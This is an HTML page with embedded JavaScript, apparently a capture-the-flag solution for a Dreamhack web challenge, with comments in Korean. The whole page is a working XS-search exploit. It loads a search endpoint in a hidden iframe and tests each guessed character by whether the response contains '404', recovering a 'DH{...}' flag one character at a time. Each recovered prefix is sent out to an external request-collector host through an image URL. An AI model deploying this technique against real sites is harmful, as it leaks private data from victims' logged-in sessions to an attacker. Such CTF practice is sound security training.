<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
                const iframeContent = iframeDocument.body.innerText;

                if (iframeContent.includes("404")) {
                    // "404"가 포함되어 있으면 reject()
                    return reject();
                } else {
                    // "404"가 포함되어 있지 않으면 resolve()
                    return resolve();
                }
            }; 
        });
    }
    async function search(query) {
        try {
            await req(
              `http://host3.dreamhack.games:17589/search?keyword=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }
    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";
        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://brzhkrf.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
    exploit();
</script>
